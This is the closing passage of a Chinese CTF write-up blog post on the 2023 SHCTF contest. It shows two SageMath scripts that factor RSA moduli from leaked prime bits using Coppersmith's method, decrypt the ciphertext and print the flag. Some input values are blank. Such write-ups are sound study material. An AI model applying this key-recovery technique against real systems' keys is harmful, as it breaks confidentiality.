<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">n2 = </span><br><span class="line">leak1 = </span><br><span class="line">enc = </span><br><span class="line"></span><br><span class="line">RF = RealField(<span class="number">2048</span>)</span><br><span class="line">X = polygen(RF)</span><br><span class="line">f = X * ((leak1 &lt;&lt; <span class="number">400</span>)-X) - n2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求p2</span></span><br><span class="line">sol = <span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">p_high = (sol &gt;&gt; <span class="number">430</span>) &lt;&lt; <span class="number">430</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n2))</span><br><span class="line">f1 = x + p_high</span><br><span class="line">x0 =f1.small_roots(X=<span class="number">2</span>^<span class="number">430</span>, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">p2 = p_high + x0</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p2 = <span class="subst">&#123;p2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求leak2</span></span><br><span class="line">q2 =N // <span class="built_in">int</span>(p2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q2 = <span class="subst">&#123;q2&#125;</span>&quot;</span>)</span><br><span class="line">phi = (p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,gmpy2.mpz(phi))</span><br><span class="line">leak2 = <span class="built_in">pow</span>(enc,d,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak2 = <span class="subst">&#123;leak2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># leak2 = 17360313144717510037537355688628643303848718125498770246433419674664931177802009718523022408554028650268575473276776652325042704063954902971874624580258429965610657615998701297143056706693836430020853673136823114239697815838085813271681130436537239288366997343978169099703086258100321964287523989425007035962983601510451873274120392974576079344343289173636686941721922540549894873583626722606223542204019760103801900148734981271526662512960432004374861666967746492254621730914184468921861371761515561318710135049915102041347748291394096585038509541586487535668372772139517571028910559303129731751631963650606704284688</span></span><br></pre></td></tr></table></figure>

<p>通过leak2求解<code>flag</code></p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">leak2 = <span class="number">22334810767801800995021872014176778873829048161801414909315794486047873481911273730826962574216771288781</span></span><br><span class="line">leak2 = leak2 &lt;&lt; <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^<span class="number">5</span>):</span><br><span class="line">    plow  = leak2 + i</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = x * <span class="number">2</span>^<span class="number">350</span> + plow</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X = <span class="number">2</span>^<span class="number">162</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        p = <span class="built_in">int</span>(roots[<span class="number">0</span>]) * <span class="number">2</span>^<span class="number">350</span> + plow</span><br><span class="line">        <span class="built_in">print</span>(p)</span><br><span class="line">        q = n // p</span><br><span class="line">        d = gmpy2.invert(e,(<span class="built_in">int</span>(p)-<span class="number">1</span>)*(<span class="built_in">int</span>(q)-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># flag&#123;9995eae8acaac286c7b72e50e5258dc3&#125;</span></span><br></pre></td></tr></table></figure>








    </div>

    
    
    
<div>
  
    <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------已经到底啦！<i class="fa fa-paw"></i>-------------</div>
    
</div>

  
</div>

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>DexterJie
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://dexterjie.github.io/2023/10/30/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023SHCTF/" title="2023SHCTF">https://dexterjie.github.io/2023/10/30/赛题复现/2023SHCTF/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Wp/" rel="tag"># Wp</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/10/27/Docker%E5%AD%A6%E4%B9%A0/" rel="prev" title="Docker学习">
                  <i class="fa fa-chevron-left"></i> Docker学习
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/10/30/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023ACTF/" rel="next" title="2023ACTF">
                  2023ACTF <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments" id="waline"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">DexterJie</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">157k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">9:31</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

<!--
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>-->


    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  
<div class="busuanzi-count">
  <script async src="/js/busuanzi.pure.mini.js"></script>
  
  <span class="site-uv" title="总访客量">
    访客量<span id="busuanzi_value_site_uv"></span>
  </span>

  <span class="site-pv" title="总访问量">
    经过<span id="busuanzi_value_site_pv"></span>次回眸与你相遇
  </span>
</div>



  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"waline-five-mocha.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"locale":null,"placeholder":"请文明评论呀","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":false,"comment_count":true,"requiredFields":[],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2023/10/30/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023SHCTF/"}</script>
<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
<script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
  ).then(() => 
    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
  );
});
</script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right"},"mobile":{"show":true}});</script></body>

</html>
